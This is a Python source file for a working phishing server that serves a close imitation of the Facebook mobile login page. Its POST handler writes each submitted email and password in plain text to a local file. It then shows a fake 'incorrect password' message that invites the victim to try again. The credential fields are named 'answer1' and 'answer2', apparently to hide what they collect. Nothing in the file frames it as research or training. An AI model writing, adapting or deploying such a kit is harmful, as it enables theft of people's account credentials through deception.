from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
import os

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        html = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Facebook – Log In or Sign Up</title>
<style>
* { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, Arial, sans-serif; }
body { margin: 0; padding: 0; background-color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
.top-bar { width: 100%; display: flex; align-items: center; padding: 15px 20px; font-size: 20px; color: #000000; }
.back-arrow { cursor: pointer; font-weight: bold; margin-right: auto; }
.lang-selector { width: 100%; text-align: center; color: #576375; font-size: 14px; margin-top: 10px; margin-bottom: 35px; display: flex; justify-content: center; align-items: center; gap: 4px; }
.lang-selector::after { content: " ∨"; font-size: 10px; }
.logo-container { margin-bottom: 40px; }
.fb-logo { width: 60px; height: 60px; background-color: #1877f2; border-radius: 50%; display: flex; justify-content: center; align-items: center; color: white; font-size: 47px; font-weight: bold; font-family: Helvetica, Arial, sans-serif; transform: translateY(4px); }
.form-container { width: 100%; max-width: 400px; padding: 0 16px; }
.input-field { width: 100%; height: 58px; border: 1px solid #ccd0d5; border-radius: 12px; padding: 0 16px; font-size: 16px; margin-bottom: 12px; outline: none; background-color: #ffffff; }
.input-field:focus { border-color: #1877f2; }
.login-btn { width: 100%; height: 44px; background-color: #1877f2; border: none; border-radius: 22px; color: #ffffff; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 4px; }
.forgot-btn { display: block; width: 100%; text-align: center; background: none; border: none; color: #000000; font-size: 15px; font-weight: 500; margin-top: 20px; cursor: pointer; text-decoration: none; }
.footer-container { margin-top: auto; width: 100%; max-width: 400px; padding: 20px 16px; text-align: center; }
.create-btn { width: 100%; height: 44px; background-color: #ffffff; border: 1px solid #1877f2; border-radius: 22px; color: #1877f2; font-size: 15px; font-weight: 600; cursor: pointer; margin-bottom: 25px; }
.meta-logo { display: flex; justify-content: center; align-items: center; gap: 4px; color: #1c2b33; font-size: 15px; font-weight: 600; letter-spacing: 0.5px; }
.meta-icon { color: #0064e0; font-size: 18px; font-weight: bold; }
</style>
</head>
<body>
<div class="top-bar"><div class="back-arrow">←</div></div>
<div class="lang-selector">English (US)</div>
<div class="logo-container"><div class="fb-logo">f</div></div>
<div class="form-container">
    <form method="POST">
        <input type="text" name="answer1" class="input-field" placeholder="Mobile number or email" required>
        <input type="password" name="answer2" class="input-field" placeholder="Password" required>
        <button type="submit" class="login-btn">Log in</button>
        <a href="#" class="forgot-btn">Forgot password?</a>
    </form>
</div>
<div class="footer-container">
    <button type="button" class="create-btn">Create new account</button>
    <div class="meta-logo"><span class="meta-icon">∞</span> Meta</div>
</div>
</body>
</html>
"""
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(html.encode("utf-8"))

    def do_POST(self):
        length = int(self.headers["Content-Length"])
        data = self.rfile.read(length).decode("utf-8")
        answers = parse_qs(data)
        answer1 = answers.get("answer1", [""])[0]
        answer2 = answers.get("answer2", [""])[0]

        # معلومات په یو فایل کې خوندې کېږي
        with open("answers.txt", "a", encoding="utf-8") as f:
            f.write(f"Email: {answer1} | Pass: {answer2}\n")

        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write("""<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"></head><body style="text-align:center; font-family:Arial, sans-serif; background:#ffffff; padding:100px 20px;"><div style="max-width:400px; margin:auto; padding:20px; border:1px solid #ccd0d5; border-radius:12px;"><h3 style="color:#1877f2; margin-bottom: 10px;">Login Error</h3><p style="color:#576375; font-size:14px;">The password you entered is incorrect. Please try again or recover your account.</p><a href="/" style="display:inline-block; margin-top:15px; color:white; background:#1877f2; padding:10px 20px; text-decoration:none; border-radius:22px; font-weight:bold; font-size:14px; width:100%;">Try Again</a></div></body></html>""".encode("utf-8"))

port = int(os.environ.get("PORT", 8080))
HTTPServer(("0.0.0.0", port), Handler).serve_forever()
